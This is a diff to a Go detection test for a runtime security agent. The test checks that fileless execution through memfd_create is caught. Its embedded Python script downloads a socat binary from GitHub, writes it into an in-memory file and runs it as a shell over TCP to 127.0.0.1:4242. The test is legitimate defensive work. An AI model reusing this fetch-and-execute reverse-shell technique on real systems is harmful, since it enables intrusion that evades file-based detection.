@@ -1861,6 +1861,7 @@ func TestProcessFilelessExecution(t *testing.T) {
 	if whichPythonErr != nil {
 		python = which(t, "python3")
 	}
+	//perl := which(t, "perl")
 
 	tests := []struct {
 		name    string
@@ -1872,34 +1873,109 @@ func TestProcessFilelessExecution(t *testing.T) {
 			name: "fileless",
 			rule: &rules.RuleDefinition{
 				ID:         "test_fileless",
-				Expression: `exec.file.name == "memfd:"`,
+				Expression: `exec.file.path =~ "/memfd:*"`,
 			},
+			// Only available from Python 3.8 on
 			command: fmt.Sprintf(`#!/bin/bash
 
-%s <<__HERE__
+%s - <<__HERE__
 #!%s
 
 import os
 from urllib.request import urlopen
 
-fd = os.memfd_create("", os.MFD_CLOEXEC);f2=open("/proc/self/fd/"+str(fd), "wb")
+fd = os.memfd_create("", os.MFD_CLOEXEC)
+f2=open("/proc/self/fd/"+str(fd), "wb")
 f1=urlopen("https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin").read()
 f2.write(f1)
 f2.close()
 os.execv("/proc/self/fd/"+str(fd), ["kittens", "TCP:127.0.0.1:4242", "EXEC:sh"])
 __HERE__
 
-echo "end of fileless test script"`, python, python),
+echo "end of fileless test script"`, python, python), // echo is necessary at end of script so that there's content in stdout, in addition to stderr. speculating that if there's only stderr output, the script is not actually executed by cmd.Run(). Expect "connection refused" error from the Python script.
 			check: func(event *sprobe.Event, rule *rules.Rule) {
 				assertFieldEqual(t, event, "exec.file.name", "memfd:")
 			},
 		},
+		{
+			name: "fileless execve with fd",
+			rule: &rules.RuleDefinition{
+				ID: "test_fileless",
+			},
+			command: fmt.Sprintf(`#!/bin/bash
+
+%s - <<__HERE__
+#!%s
+
+import os
+from urllib.request import urlopen
+
+fd = os.memfd_create("", os.MFD_CLOEXEC)
+f2=open("/proc/self/fd/"+str(fd), "wb")
+f1=urlopen("https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin").read()
+f2.write(f1)
+f2.close()
+os.execve(fd, ["options", "-V"], {})
+__HERE__
+`, python, python), // echo is necessary at end of script so that there's content in stdout, in addition to stderr. speculating that if there's only stderr output, the script is not actually executed by cmd.Run(). Expect "connection refused" error from the Python script.
+			check: func(event *sprobe.Event, rule *rules.Rule) {
+				assertFieldEqual(t, event, "exec.file.name", "memfd:")
+			},
+		},
+		//		{
+		//			name: "fileless using Perl",
+		//			rule: &rules.RuleDefinition{
+		//				ID:         "test_fileless",
+		//				Expression: `exec.file.name == "memfd:"`,
+		//			},
+		//			command: fmt.Sprintf(`#!/bin/bash
+		//
+		//%s <<__HERE__
+		//#!%s
+		//
+		//my $name = "";
+		//my $fd = syscall(319, $name, 1);
+		//if (-1 == $fd) {
+		//        die "memfd_create: $!";
+		//}
+		//__HERE__
+		//
+		//echo "end of fileless test script"`, python, python), // echo is necessary at end of script so that there's content in stdout, in addition to stderr. speculating that if there's only stderr output, the script is not actually executed by cmd.Run(). Expect "connection refused" error from the Python script.
+		//			check: func(event *sprobe.Event, rule *rules.Rule) {
+		//				assertFieldEqual(t, event, "exec.file.name", "memfd:")
+		//			},
+		//		},
+		//		{
+		//			name: "shm",
+		//			rule: &rules.RuleDefinition{
+		//				ID:         "test_fileless",
+		//				Expression: `exec.file.name == "memfd:"`,
+		//			},
+		//			command: fmt.Sprintf(`#!/bin/bash
+		//
+		//%s <<__HERE__
+		//#!%s
+		//
+		//my $name = "";
+		//my $fd = syscall(319, $name, 1);
+		//if (-1 == $fd) {
+		//        die "memfd_create: $!";
+		//}
+		//__HERE__
+		//
+		//echo "end of fileless test script"`, python, python), // echo is necessary at end of script so that there's content in stdout, in addition to stderr. speculating that if there's only stderr output, the script is not actually executed by cmd.Run(). Expect "connection refused" error from the Python script.
+		//			check: func(event *sprobe.Event, rule *rules.Rule) {
+		//				assertFieldEqual(t, event, "exec.file.name", "memfd:")
+		//			},
+		//		}, // TODO: tmpfs
 	}
 
 	var ruleList []*rules.RuleDefinition
-	for _, test := range tests {
-		ruleList = append(ruleList, test.rule)
-	}
+	//for _, test := range tests {
+	//	ruleList = append(ruleList, test.rule)
+	//}
+
+	ruleList = append(ruleList, tests[0].rule)
 
 	testModule, err := newTestModule(t, nil, ruleList, testOpts{})
 	if err != nil {
@@ -1907,30 +1983,52 @@ echo "end of fileless test script"`, python, python),
 	}
 	defer testModule.Close()
 
+	syscallTester, err := loadSyscallTester(t, testModule, "syscall_tester")
+	if err != nil {
+		t.Fatal(err)
+	}
+
 	for _, test := range tests {
 		t.Run(test.name, func(t *testing.T) {
-			scriptLocation := fmt.Sprintf("/tmp/%s", "filelessScript")
-			if scriptWriteErr := os.WriteFile(scriptLocation, []byte(test.command), 0755); scriptWriteErr != nil {
-				t.Fatalf("could not write %s: %s", scriptLocation, scriptWriteErr)
-			}
-			defer os.Remove(scriptLocation)
 
 			testModule.WaitSignal(t, func() error {
-				// Running exec.Command(python, ...) does not pass this test, despite the stdout/stderr being as expected.
-				// I think it's because the Python fileless test script runs but doesn't succeed, so somehow Go swallows the execution event?
-				cmd := exec.Command(scriptLocation)
-				_, scriptRunErr := cmd.CombinedOutput()
-				if scriptRunErr != nil {
-					t.Errorf("could not run %s: %s", scriptLocation, scriptRunErr)
-				}
-
-				return nil
+				return runSyscallTesterFunc(t, syscallTester, "fileless", "script")
 			}, func(event *sprobe.Event, rule *rules.Rule) {
 				assertTriggeredRule(t, rule, test.rule.ID)
 				if test.check != nil {
 					test.check(event, rule)
 				}
 			})
+
+			//	scriptLocation := fmt.Sprintf("/tmp/%s", "filelessScript")
+			//	if scriptWriteErr := os.WriteFile(scriptLocation, []byte(test.command), 0755); scriptWriteErr != nil {
+			//		t.Fatalf("could not write %s: %s", scriptLocation, scriptWriteErr)
+			//	}
+			//	defer os.Remove(scriptLocation)
+			//
+			//	testModule.WaitSignal(t, func() error {
+			//		// Running exec.Command(python, ...) does not pass this test, despite the stdout/stderr being as expected.
+			//		// I believe that if the result of the exec only has content in stderr, and no content in stdout, go cancels the exec.
+			//		cmd := exec.Command(scriptLocation)
+			//		var stdout bytes.Buffer
+			//		var stderr bytes.Buffer
+			//		cmd.Stdout = &stdout
+			//		cmd.Stderr = &stderr
+			//		scriptRunErr := cmd.Run()
+			//		if scriptRunErr != nil {
+			//			t.Errorf("could not run %s: %s | stderr: %s | stdout: %s", scriptLocation, scriptRunErr, stderr.String(), stdout.String())
+			//		}
+			//
+			//		fmt.Println(stderr.String())
+			//		fmt.Println(stdout.String())
+			//
+			//		return nil
+			//	}, func(event *sprobe.Event, rule *rules.Rule) {
+			//		assertTriggeredRule(t, rule, test.rule.ID)
+			//		if test.check != nil {
+			//			test.check(event, rule)
+			//		}
+			//	})
 		})
 	}
 }
